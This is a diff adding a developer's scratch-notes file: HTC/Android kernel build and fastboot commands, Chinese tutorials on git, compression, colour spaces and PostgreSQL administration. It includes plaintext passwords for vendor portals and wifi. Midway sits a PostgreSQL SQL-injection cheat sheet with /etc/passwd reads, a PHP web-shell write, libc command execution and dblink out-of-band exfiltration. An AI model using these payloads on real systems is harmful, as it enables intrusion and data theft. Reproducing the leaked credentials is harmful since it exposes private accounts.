@@ -1,0 +1,826 @@
+rachel_zhang
+
+QCOM support password 
+;lkJ1234
+
+make ARCH=arm CROSS_COMPILE=arm-eabi- z4td_defconfig
+make ARCH=arm CROSS_COMPILE=arm-eabi- -j4
+
+fastboot flash image arch/arm/boot/Image
+
+htc_fastboot flash zimage arch/arm/boot/zImage
+
+
+fastboot reboot
+
+
+
+repo upload --re haibo_wang@htc.com,qingyuan_li@htc.com,chao_zhang@htc.com,clean_li@htc.com,hanker_lu@htc.com,allen_wang@htc.com,wen_zhou@htc.com,gang_shao@htc.com,xin_li@htc.com
+
+
+
+_http://git.htc.com:8081/#/SignInFailure,SIGN_IN,Session cookie not available
+
+
+ ssh://haihui_li@10.33.8.6:29419/manifest.git -b htc -m jb-mr0-rel_shep_sprd8825_dsda_sense50_crc-8825.xml
+
+ You will receive an email to verify that your email address is active and accurate. You will need to follow the steps in the email in order for your request to be processed.
+Confirmation Code:
+	
+CQM6HNH7
+Date:
+	
+2014-02-09 21:25 PST
+Name:
+	
+haihui li
+User Name:
+	
+haihui_li@htc.com ;lKJ1234
+
+
+
+description
+   Line mode
+     <C-h><C-h>   Highlight current line
+     <C-h><C-a>   Advance color for next line highlight
+     <C-h><C-r>   Clear last line highlight
+
+   Pattern mode
+     <C-h><C-w>   Highlight word under cursor (whole word match)
+     <C-h><C-l>    Highlight all lines having word under cursor (whole word match)
+     <C-h><C-f>    Highlight word under cursor (partial word match)
+     <C-h><C-k>   Highlight all lines having word under cursor (partial word match)
+     <C-h><C-s>   Highlight last search pattern
+     <C-h><C-j>    Highlight all lines having last search pattern
+     <C-h><C-d>   Clear last pattern highlight
+
+     <C-h><C-n>   Clear all highlights
+
+   All above commands work in both normal & insert modes.
+   <C-h><C-h> also works in visual mode. (Select desired lines & hit <C-h><C-h>)
+
+
+Linux 常用的压缩命令有 gzip 和 zip，两种压缩包的结尾不同：zip 压缩的后文件是 *.zip ，而 gzip 压缩后的文件 *.gz 
+相应的解压缩命令则是 gunzip 和 unzip 
+
+gzip 命令： 
+# gzip test.txt 
+它会将文件压缩为文件 test.txt.gz，原来的文件则没有了，解压缩也一样 
+
+# gunzip test.txt.gz 
+它会将文件解压缩为文件 test.txt，原来的文件则没有了，为了保留原有的文件，我们可以加上 -c 选项并利用 linux 的重定向 
+
+# gzip -c test.txt > /root/test.gz 
+这样不但可以将原有的文件保留，而且可以将压缩包放到任何目录中，解压缩也一样 
+
+# gunzip -c /root/test.gz > ./test.txt 
+
+
+zip 命令： 
+# zip test.zip test.txt 
+它会将 test.txt 文件压缩为 test.zip ，当然也可以指定压缩包的目录，例如 /root/test.zip 
+
+# unzip test.zip 
+它会默认将文件解压到当前目录，如果要解压到指定目录，可以加上 -d 选项 
+
+# unzip test.zip -d /root/ 
+
+
+
+
+tty minicom
+fastboot oem writeconfig 5 400
+
+fastboot oem rebootRUU
+
+htc_fastboot oem readconfig
+
+minicom -D /dev/ttyUSB0
+
+
+git merge vs rebase vs cherry-pick
+Posted on 2011/02/13	
+
+git merge是用来合并两个分支的。
+# 将b分支合并到当前分支
+git merge b
+
+git cherry-pick可以选择某一个分支中的一个或几个commit(s)来进行操作。例如，假设我们有个稳定版本的分支，叫v2.0，另外还有个开发版本的分支v3.0，我们不能直接把两个分支合并，这样会导致稳定版本混乱，但是又想增加一个v3.0中的功能到v2.0中，这里就可以使用cherry-pick了。
+# 先在v3.0中查看要合并的commit的commit id
+git log
+# 假设是 commit f79b0b1ffe445cab6e531260743fa4e08fb4048b
+
+# 切到v2.0中
+git check v2.0
+
+# 合并commit
+git cherry-pick f79b0b1ffe445cab6e531260743fa4e08fb4048b
+
+git rebase有点类似git merge，但是两者又有不同，打个比方，你有两个抽屉A和B，里面都装了衣服，现在想把B中的衣服放到A中，git merge是那种横冲直撞型的，拿起B就倒入A里面，如果满了（冲突）再一并整理；而git rebase就很持家了，它会一件一件的从B往A中加，会根据一开始放入的时间顺序的来加，如果满了你可以处理这一件，你可以继续加，或者跳过这一件，又或者不加了，把A还原。所以merge适合那种比较琐碎的，简单的合并，系统级的合并还是用rebase吧。
+
+专业的区别请移步到这里合并和衍合
+# 合并b
+git rebase b
+
+# 处理完冲突继续合并
+git rebase --continue
+
+# 跳过
+git rebase --skip
+
+# 取消合并
+git rebase --abort
+
+
+Git 的origin和master分析  
+
+2013-03-01 14:52:47|  分类： Git |举报 |字号 订阅
+
+<<关键是 中英文切换着打字太辛苦了转载请注明出处>>
+
+ 
+
+首先要明确一点，对git的操作是围绕3个大的步骤来展开的（其实几乎所有的SCM都是这样）
+
+1.     从git取数据（git clone）
+
+2.     改动代码
+
+3.     将改动传回git（git push）
+
+这3个步骤又涉及到两个repository，一个是remote repository，再远程服务器上，一个是local repository，再自己工作区上。其中
+
+1, 3两个步骤涉及到remote server/remote repository/remote branch，
+
+2涉及到local repository/local branch。git clone 会根据你指定的remote server/repository/branch，拷贝一个副本到你本地，再git push之前，你对所有文件的改动都是在你自己本地的local repository来做的，你的改动(local branch)和remote branch是独立（并行）的。Gitk显示的就是local repository。
+
+ 
+
+在clone完成之后，Git 会自动为你将此远程仓库命名为origin（origin只相当于一个别名，运行git remote –v或者查看.git/config可以看到origin的含义），并下载其中所有的数据，建立一个指向它的master 分支的指针，我们用(远程仓库名)/(分支名) 这样的形式表示远程分支，所以origin/master指向的是一个remote branch（从那个branch我们clone数据到本地），但你无法在本地更改其数据。
+
+同时，Git 会建立一个属于你自己的本地master 分支，它指向的是你刚刚从remote server传到你本地的副本。随着你不断的改动文件，git add, git commit，master的指向会自动移动，你也可以通过merge（fast forward）来移动master的指向。
+
+ $git branch -a (to show all the branches git knows about)
+
+* master
+
+  remotes/origin/HEAD -> origin/master
+
+  remotes/origin/master
+
+ 
+
+$git branch -r (to show remote branches git knows about)
+
+  origin/HEAD -> origin/master
+
+  origin/master
+
+ 
+
+可以发现，master就是local branch，origin/master是remote branch（master is a branch in the local repository. remotes/origin/master is a branch named master on the remote named origin）
+
+$git diff origin/master master （show me the changes between the remote master branch and my master branch).
+
+需要注意的是，remotes/origin/master和origin/master的指向是相同的
+
+$git diff origin/master remotes/origin/master
+
+ 
+
+git push origin master
+
+origin指定了你要push到哪个remote
+
+master其实是一个“refspec”，正常的“refspec”的形式为”+<src>:<dst>”，冒号前表示local branch的名字，冒号后表示remote repository下 branch的名字。注意，如果你省略了<dst>，git就认为你想push到remote repository下和local branch相同名字的branch。听起来有点拗口，再解释下，push是怎么个push法，就是把本地branch指向的commit push到remote repository下的branch，比如
+
+$git push origin master:master (在local repository中找到名字为master的branch，使用它去更新remote repository下名字为master的branch，如果remote repository下不存在名字是master的branch，那么新建一个)
+
+$git push origin master （省略了<dst>，等价于“git push origin master:master”）
+
+$git push origin master:refs/for/mybranch (在local repository中找到名字为master的branch，用他去更新remote repository下面名字为mybranch的branch)
+
+$git push origin HEAD:refs/for/mybranch （HEAD指向当前工作的branch，master不一定指向当前工作的branch，所以我觉得用HEAD还比master好些）
+
+$git push origin :mybranch （再origin repository里面查找mybranch，删除它。用一个空的去更新它，就相当于删除了）
+
+
+
+
+
+
+
+
+
+yuv和yCbCr的差异
+分类： 视频信号处理 2012-04-21 21:19 3194人阅读 评论(2) 收藏 举报
+signal图像处理h.264videobasic存储
+yuv和yCbCr的差异
+ 
+ 
+
+ 
+
+一、和rgb之间换算公式的差异
+
+yuv<-->rgb
+
+Y'= 0.299*R' + 0.587*G' + 0.114*B'
+
+U'= -0.147*R' - 0.289*G' + 0.436*B' = 0.492*(B'- Y')
+
+V'= 0.615*R' - 0.515*G' - 0.100*B' = 0.877*(R'- Y')
+
+R' = Y' + 1.140*V'
+
+G' = Y' - 0.394*U' - 0.581*V'
+
+B' = Y' + 2.032*U'
+
+yCbCr<-->rgb
+
+Y’ = 0.257*R' + 0.504*G' + 0.098*B' + 16
+
+Cb' = -0.148*R' - 0.291*G' + 0.439*B' + 128
+
+Cr' = 0.439*R' - 0.368*G' - 0.071*B' + 128
+
+R' = 1.164*(Y’-16) + 1.596*(Cr'-128)
+
+G' = 1.164*(Y’-16) - 0.813*(Cr'-128) - 0.392*(Cb'-128)
+
+B' = 1.164*(Y’-16) + 2.017*(Cb'-128)
+
+Note: 上面各个符号都带了一撇，表示该符号在原值基础上进行了gamma correction
+
+ 
+
+二、来源上的差异
+
+yuv色彩模型来源于rgb模型，
+
+该模型的特点是将亮度和色度分离开，从而适合于图像处理领域。
+
+应用：basic color model used in analogue color TV broadcasting.
+
+ 
+
+YCbCr模型来源于yuv模型。YCbCr is a scaled and offset version of the YUV color space.
+
+应用：数字视频，ITU-R BT.601 recommendation
+
+ 
+
+ps:
+
+通过上面的比较可以确定，我们在h.264,mpeg等编码标准中用的yuv其实是YcbCr，大家不要被名称搞混淆了
+
+ 
+4．1．3．3 彩色空间的线性变换标准
+为了使用人的视角特性以降低数据量，通常把RGB空间表示的彩色图像变换到其他彩色空间。目前采用的彩色空间变换有三种：YIQ, YUV和YCrCb。每一种彩色空间都产生一种亮度分量信号和两种色度分量信号，而每一种变换使用的参数都是为了适应某种类型的显示设备。其中，YIQ适用于NTSC彩色电视制式，YUV适用于PAL和SECAM彩色电视制式，而YCrCb适用于计算机用的显示器。
+1、 YUV与YIQ模型
+  在彩色电视制式中，使用YUV和YIQ模型来表示彩色图像。在PAL彩色电视制式中使用YUV模型，其中的YUV不是那几个英文单词的组合词，而是符号，Y表示亮度，UV用来表示色差，U、V是构成彩色的两个分量；在NTSC彩色电视制式中使用YIQ模型，其中的Y表示亮度，I、Q是两个彩色分量
+YUV的优点：
+1、YUV表示法的重要性是它的亮度信号(Y)和色度信号(U、V)是相互独立的 。
+2、YUV表示法的另一个优点是可以利用人眼的特性来降低数字彩色图像所需要的存储容量。
+ 
+在考虑人的视觉系统和阴极射线管(CRT)的非线性特性之后，RGB和YUV的对应关系可以近似地用下面的方程式表示：
+ 
+Y = 0.299R + 0.587G + 0.114B
+U = - 0.147R- 0.289G + 0.436B
+V = 0.615R - 0.515G - 0.100B
+ 
+3 \YIQ与RGB彩色空间变换
+RGB和YIQ的对应关系用下面的方程式表示：
+Y = 0.299R + 0.587G + 0.114B
+I = 0.596R - 0.275G - 0.321B
+Q = 0.212R - 0.523G + 0.311B
+或者写成矩阵的形式，
+ 
+4 YCrCb与RGB彩色空间变换
+   数字域中的彩色空间变换与模拟域的彩色空间变换不同。它们的分量使用Y、Cr和Cb来表示，与RGB空间的转换关系如下：
+Y＝0.299R＋0.578G＋0.114B
+Cr＝(0.500R－0.4187G－0.0813B)＋128
+Cb=(-0.1687R－0.3313G＋0.500B)＋128
+或者写成矩阵的形式，
+ 
+4. ITU-R BT.601标准摘要
+   ITU-R BT.601用于对隔行扫描电视图像进行数字化，对NTSC和PAL制彩色电视的采样频率和有效显示分辨率都作了规定。下表给出了ITU-R BT.601推荐的采样格式、编码参数和采样频率。
+    ITU-R BT.601推荐使用4∶2∶2的彩色电视图像采样格式。使用这种采样格式时，Y用13.5 MHz的采样频率，Cr，Cb用6.75 MHz的采样频率。采样时，采样频率信号要与场同步和行同步信号同步。
+ 
+1. 彩色空间之间的转换
+  在数字域而不是模拟域中RGB和YCbCr两个彩色空间之间的转换关系用下式表示：
+Y = 0.299R + 0.587G + 0.114B
+Cr = (0.500R - 0.4187G - 0.0813B) + 128
+Cb = (-0.1687R - 0.3313G + 0.500B) + 128
+
+ 
+4.1.4.2  彩色电视信号的类型
+1、 复合电视信号
+    包含亮度信号、色差信号和所有定时信号的单一信号叫做复合电视信号(composite video signal)，或者称为全电视信号。
+2、 分量电视信号
+分量电视信号(component video signal)是指每个基色分量作为独立的电视信号。每个基色既可以分别用R、G和B表示，也可以用亮度-色差表示，如Y、I和Q，Y、U和V。使用分量电视信号是表示颜色的最好方法，但需要比较宽的带宽和同步信号。
+3、 S-Video信号
+分离电视信号S-Video(Separated video-VHS)是亮度和色差分离的一种电视信号，是分量模拟电视信号和复合模拟电视信号的一种折中方案。使用S-Video有两个优点：
+(1) 减少亮度信号和色差信号之间的交叉干扰。
+(2) 不须要使用梳状滤波器来分离亮度信号和色差信号，这样可提高亮度信号的带宽。
+ 
+2、 电视扫描和同步
+扫描有隔行扫描(interlaced scanning)和非隔行扫描之分。非隔行扫描也称逐行扫描，图4-08表示了这两种扫描方式的差别。黑白电视和彩色电视都用隔行扫描，而计算机显示图像时一般都采用非隔行扫描。
+
+VDDL 最小工作电压
+VDDH 最大工作电压
+
+
+wifi password
+
+1120zjHg
+
+
+-         Link: _http://eportal.mediatek.com/
+
+-         Username: GLAY_CHIU
+
+-         Password: cat12345
+
+
+ALPS.L0.MP6.TC7SP.IRMNK2.p2_0126_V1 
+9791888786
+
+
+
+#PostgreSQL and PHP supports Batched Queries.
+#Awesome, huh? (是不是很酷？)
+
+Version:
+
+SELECT VERSION()
+
+Directories:
+
+SELECT current_setting(‘data_directory’)
+SELECT current_setting(‘hba_file’)
+SELECT current_setting(‘config_file’)
+SELECT current_setting(‘ident_file’)
+SELECT current_setting(‘external_pid_file’)
+
+Users:
+
+SELECT user;
+SELECT current_user;
+SELECT session_user;
+SELECT getpgusername();
+
+Current Database:
+
+SELECT current_database();
+
+Concatenation:
+
+SELECT 1||2||3; #Returns 123
+
+Get Collation:
+
+SELECT pg_client_encoding(); #Returns your current encoding (collation).
+
+Change Collation:
+
+SELECT convert(‘foobar_utf8′,’UTF8′,’LATIN1′); #Converts foobar from utf8 to latin1.
+SELECT convert_from(‘foobar_utf8′,’LATIN1′); #Converts foobar to latin1.
+SELECT convert_to(‘foobar’,'UTF8′); #Converts foobar to utf8.
+SELECT to_ascii(‘foobar’,'LATIN1′); #Converts foobar to latin1.
+
+Wildcards in SELECT(s):
+
+SELECT foo FROM bar WHERE id LIKE ‘test%’; #Returns all COLUMN(s) starting with “test”.
+SELECT foo FROM bar WHERE id LIKE ‘%test’; #Returns all COLUMN(s) ending with “test”.
+
+Regular Expression in SELECT(s):
+
+#Returns all columns matching the regular expression.
+
+SELECT foo FROM bar WHERE id ~* ‘(moo|rawr).*’;
+SELECT foo FROM bar WHERE id SIMILAR ‘(moo|rawr).*’;
+
+SELECT Without Dublicates:
+
+SELECT DISTINCT foo FROM bar
+
+Counting Columns:
+
+SELECT COUNT(*) FROM foo.bar; #Returns the amount of rows from the table “foo.bar”.
+
+Get Amount of PostgreSQL Users:
+
+SELECT COUNT(*) FROM pg_catalog.pg_user
+
+Get PostgreSQL Users:
+
+SELECT usename FROM pg_user
+
+Get PostgreSQL User Privileges on Different Columns:
+
+SELECT table_schema,table_name,column_name,privilege_type FROM information_schema.column_privileges
+
+Get PostgreSQL User Privileges:
+
+SELECT usename,usesysid,usecreatedb,usesuper,usecatupd,valuntil,useconfig FROM pg_catalog.pg_user
+
+Get PostgreSQL User Credentials & Privileges:
+
+SELECT usename,passwd,usesysid,usecreatedb,usesuper,usecatupd,valuntil,useconfig FROM pg_catalog.pg_shadow
+
+Get PostgreSQL DBA Accounts:
+
+SELECT * FROM pg_shadow WHERE usesuper IS TRUE
+SELECT * FROM pg_user WHERE usesuper IS TRUE
+
+Get Databases:
+
+SELECT nspname FROM pg_namespace WHERE nspacl IS NOT NULL
+SELECT datname FROM pg_database
+SELECT schema_name FROM information_schema.schemata
+SELECT DISTINCT schemaname FROM pg_tables
+SELECT DISTINCT table_schema FROM information_schema.columns
+SELECT DISTINCT table_schema FROM information_schema.tables
+
+Get Databases & Tables:
+
+SELECT schemaname,tablename FROM pg_tables
+SELECT table_schema,table_name FROM information_schema.tables
+SELECT DISTINCT table_schema,table_name FROM information_schema.columns
+
+Get Databases, Tables & Columns:
+
+SELECT table_schema,table_name,column_name FROM information_schema.columns
+
+SELECT A Certain Row:
+
+SELECT column_name FROM information_schema.columns LIMIT 1 OFFSET 0; #Returns row 0.
+SELECT column_name FROM information_schema.columns LIMIT 1 OFFSET 1; #Returns row 1.
+…
+SELECT column_name FROM information_schema.columns LIMIT 1 OFFSET N; #Returns row N.
+
+Conversion (Casting):
+
+SELECT CAST(’1′ AS INTEGER) #Converts the varchar “1″ to integer.
+
+Substring:
+
+SELECT SUBSTR(‘foobar’,1,3); #Returns foo.
+SELECT SUBSTRING(‘foobar’,1,3); #Returns foo.
+
+Hexadecimal Evasion:
+
+#Not as fancy as in MySQL, but it sure works!
+
+SELECT decode(’41424344′,’hex’); #Returns ABCD.
+SELECT decode(to_hex(65), chr(104)||chr(101)||chr(120)); #Returns A.
+
+ASCII to Number:
+
+SELECT ASCII(‘A’); #Returns 65.
+
+Number to ASCII:
+
+SELECT CHR(65); #Returns A.
+
+If Statement:
+
+#Impossible in SELECT statements.
+#However, here’s a work-around with sub-select(s).
+
+SELECT (SELECT 1 WHERE 1=1); #Returns 1.
+SELECT (SELECT 1 WHERE 1=2); #Returns NULL.
+
+Case Statement:
+
+#May be used instead of the If-Statement.
+
+SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END; #Returns 1.
+
+Read File(s):
+
+CREATE TABLE file(content text);
+COPY file FROM ‘/etc/passwd’;
+UNION ALL SELECT content FROM file LIMIT 1 OFFSET 0;
+UNION ALL SELECT content FROM file LIMIT 1 OFFSET 1;
+…
+UNION ALL SELECT content FROM file LIMIT 1 OFFSET N;
+DROP TABLE file;
+
+Write File(s):
+
+CREATE TABLE file(content text);
+INSERT INTO file(content) VALUES (‘<?PHP $s=$_GET;@chdir($s[/'x/']);echo@system($s[/'y/'])?>’);
+COPY file(content) TO ‘/tmp/shell.php’;
+
+Logical Operator(s):
+
+#http://en.wikipedia.org/wiki/Logical_connective
+
+AND
+OR
+NOT
+
+Comments:
+
+SELECT foo, bar FROM foo.bar/* Multi line comment */
+SELECT foo, bar FROM foo.bar– Single line comment
+
+A few evasions/methods to use between your PostgreSQL statements:
+
+CR (%0D); #Carrier Return.
+
+LF (%0A); #Line Feed.
+
+Tab (%09); #The Tab-key.
+
+Space (%20); #Most commonly used. You know what a space is.
+
+Multiline Comment (/**/); #Well, as the name says.
+
+Parenthesis, ( and ); #Can also be used as separators when used right.
+
+Parenthesis instead of space:
+
+#As said two lines above, the use of parenthesis can be used as a separator.
+
+SELECT * FROM foo.bar WHERE id=(-1)UNION(SELECT(1),(2));
+
+Auto-Casting to Right Collation:
+
+SELECT CONVERT_TO(‘foobar’,pg_client_encoding());
+
+Benchmark:
+
+#Takes about 7.5 seconds to perform this logical operation.
+#Which can be compared to BENCHMARK(MD5(1),1500000) on MySQL.
+
+SELECT (||/(9999!));
+
+Sleep:
+
+SELECT PG_SLEEP(5); #Sleeps the PostgreSQL database for 5 seconds.
+
+Get PostgreSQL IP:
+
+SELECT inet_server_addr()
+
+Get PostgreSQL Port:
+
+SELECT inet_server_port()
+
+Command Execution:
+
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6′, ‘system’ LANGUAGE ‘C’ STRICT;
+SELECT system(‘echo Hello.’);
+
+DNS Requests (OOB (Out-Of-Band)):
+
+SELECT * FROM dblink(‘host=www.your.host.com user=DB_Username dbname=DB’, ‘SELECT YourQuery’) RETURNS (result TEXT);
+
+Having Fun With PostgreSQL:
+
+    dblink: The Root Of All Evil
+    Mapping Library Functions
+    From Sleeping and Copying In PostgreSQL 8.2
+    Recommendation and Prevention
+    Introducing pgshell
+
+1.createdb 数据库名称
+产生数据库
+2.dropdb 数据库名称
+删除数据库
+
+3.CREATE USER 用户名称
+创建用户
+4.drop User 用户名称
+删除用户
+
+5.SELECT usename FROM pg_user;
+查看系统用户信息
+\du
+
+7.SELECT version();
+查看版本信息
+
+8.psql 数据库名
+打开psql交互工具
+
+9.mydb=> \i basics.sql
+\i 命令从指定的文件中读取命令。
+
+10.COPY weather FROM '/home/user/weather.txt';
+批量将文本文件中内容导入到wether表
+
+11.SHOW search_path;
+显示搜索路径
+
+12.创建用户
+CREATE USER 用户名 WITH PASSWORD '密码'
+
+13.创建模式
+CREATE SCHEMA myschema;
+
+14.删除模式
+DROP SCHEMA myschema;
+
+15.查看搜索模式
+SHOW search_path;
+
+16.设置搜索模式
+SET search_path TO myschema,public;
+
+17.创建表空间
+create tablespace 表空间名称 location '文件路径';
+
+18.显示默认表空间
+show default_tablespace;
+
+19.设置默认表空间
+set default_tablespace=表空间名称;
+
+20.指定用户登录
+psql MTPS -u
+
+21.显示当前系统时间、
+now()
+
+22.配置plpgsql语言
+CREATE LANGUAGE 'plpgsql' HANDLER plpgsql_call_handler
+
+23.删除规则
+
+DROP RULE name ON relation [ CASCADE | RESTRICT ]
+?
+输入
+name
+要删除的现存的规则．
+
+relation
+该规则应用的关系名字(可以有大纲修饰)．
+
+CASCADE
+自动删除依赖于此规则的对象。
+
+RESTRICT
+如果有任何依赖对象，则拒绝删除此规则。这个是缺省。
+
+24.日期格式函数
+select 'P'||to_char(current_date,'YYYYMMDD')||'01'
+
+25.产生组
+Create Group 组名称
+
+26.修改用户归属组
+Alter Group 组名称 add user 用户名称
+
+26.为组赋值权限
+?
+grant 操作 On 表名称 to group 组名称：
+
+27.创建角色
+Create Role 角色名称
+
+28.删除角色
+Drop Role 角色名称
+
+29.获得当前postgresql版本
+SELECT version();
+
+30.在linux中执行计划任务
+通过crontab执行
+su root -c "psql -p 5433 -U developer MTPS -c'select test()'"
+developer用户的密码存储于环境变量PGPASSWORD中。
+
+31.查询表是否存在
+select * from pg_statio_user_tables where relname='你的表名';
+
+32.为用户复制SCHEMA权限
+grant all on SCHEMA 作用域名称 to 用户名称
+
+33.整个数据库导出
+pg_dumpall -D -p 端口号 -h 服务器IP -U postgres(用户名) > /home/xiaop/all.bak
+
+34.数据库备份恢复
+psql -h 192.168.0.48 -p 5433 -U postgres </home/postgres
+
+35.当前日期函数
+current_date
+
+36.返回第十条开始的5条记录
+select * from tabname limit 5 offset 10;
+
+37.为用户赋模式权限
+Grant on schema developer to UDataHouse
+
+38.将字符转换为日期时间
+select to_timestamp('2010-10-21 12:31:22', 'YYYY-MM-DD hh24:mi:ss')
+
+39.数据库备份
+pg_dumpall -h 192.168.0.4 -p 5433 -U postgres >/DataBack/Postgresql2010012201.dmp
+如8.1以后多次输入密码
+
+40.\dn
+查看schema
+
+41.删除schema
+drop schema _clustertest cascade;
+
+42.导出表
+
+./pg_dump -p 端口号 -U 用户 -t 表名称 -f 备份文件位置 数据库 ;
+
+43.字符串操作函数
+select distinct(split_part(ip,'.',1)||'.'||split_part(ip,'.',2)) from t_t_userip order by (split_part(ip,'.',1)||'.'||split_part(ip,'.',2));
+
+44.删除表主键
+alter table 表名 drop CONSTRAINT 主键名称;
+
+45.创建表空间
+create tablespace 空间名称 location '路径'
+
+46.查看表结构
+select * from information_schema.columns?
+
+?
+
+
+./postgres -D /usr/local/src/data
+or
+./pg_ctl -D /usr/local/src/data -l logfile start
+
+
+47.查看数据库大小
+SELECT pg_size_pretty(pg_database_size('MTPS')) As fulldbsize;
+
+48.查看数据库表大小
+SELECT pg_size_pretty(pg_total_relation_size('developer.t_L_collectfile')) As fulltblsize,
+pg_size_pretty(pg_relation_size('developer.t_L_collectfile')) As justthetblsize
+
+49.设置执行超过指定秒数的sql语句输出到日志
+log_min_duration_statement = 3
+
+50.超过一定秒数sql自动执行执行计划
+shared_preload_libraries = 'auto_explain'
+custom_variable_classes = 'auto_explain'
+auto_explain.log_min_duration = 4s
+
+51.数据库备份
+?select pg_start_backup('backup baseline');
+?select pg_stop_backup();
+
+?recovery.conf
+?restore_command='cp /opt/buxlog/%f %p'
+
+52.重建索引
+?REINDEX { INDEX | TABLE | DATABASE | SYSTEM } name [ FORCE ]
+?INDEX
+?重新建立声明了的索引。
+
+?TABLE
+?重新建立声明的表的所有索引。如果表有个从属的"TOAST"表，那么这个表也会重新索引。
+
+?DATABASE
+?重建当前数据库里的所有索引。 除非在独立运行模式下，会忽略在共享系统表上的索引（见下文）。
+
+?SYSTEM
+?在当前数据库上重建所有系统表上的索引。不会处理在用户表上的索引。 另外，除了是在单主机模式下，共享的系统表也会被忽略（见下文）。
+
+?name
+?需要重建索引的索引，表或者数据库的名称。 表和索引名可以有模式修饰。 目前，REINDEX DATABASE 和 REINDEX SYSTEM 只能重建当前数据库的索引， 因此其参数必须匹配当前数据库的名字。
+
+?FORCE
+?这是一个废弃的选项，如果声明，会被忽略。
+
+
+54.数据字典查看表结构
+SELECT column_name, data_type from information_schema.columns where table_name = 'blog_sina_content_train';
+
+?
+
+
+52.查看被锁定表
+SELECT pg_class.relname AS table, pg_database.datname AS database, pid, mode, granted
+FROM pg_locks, pg_class, pg_database
+WHERE pg_locks.relation = pg_class.oid
+AND pg_locks.database = pg_database.oid;
+
+53.查看客户端连接情况
+SELECT client_addr ,client_port,waiting,query_start,current_query FROM pg_stat_activity;
+
+54.判断字符是否全部为数字
+select * from t_c_username where length(username)=11 and substr(username,1,11) SIMILAR TO '[0-9]+';
+
+
+55.查看客户端编码
+show client_encoding;
+
+find ./ -name "*.rej" -exec rm {} \;
+
+sed -i "s/10.33.8.6/shh1.aosp.git.htc.com/g" $(find ./ -name "FETCH_HEAD")
+
+
+tcpdump -vv -s 0 -w /sdcard/hello.cap
